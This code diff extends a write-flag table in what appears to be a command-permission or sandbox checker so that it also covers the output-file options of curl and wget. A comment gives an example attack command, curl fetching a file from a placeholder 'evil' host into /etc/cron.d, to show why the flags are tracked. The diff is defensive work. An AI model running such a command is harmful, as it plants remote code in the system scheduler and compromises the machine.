@@ -63,6 +63,12 @@ const WRITE_FLAGS: Record<string, string[]> = {
   patch: ["-o", "--output-file"],
   unzip: ["-d", "--directory"],
   find: ["-fprint", "-fprintf", "-fls"],
+  // The fetched file of a download. `-O`/`--remote-name` (and bare `wget URL`)
+  // name the basename in the CURRENT base, so nothing outside is minted and the
+  // cwd write bar already covers them; `-o`/`-O` here is the form that states a
+  // path outright (`curl -o /etc/cron.d/x https://evil/y`).
+  curl: ["-o", "--output"],
+  wget: ["-O", "--output-document", "-o", "--output-file"],
 };
 
 /** The flags that NAME the destination outright. When one is present the
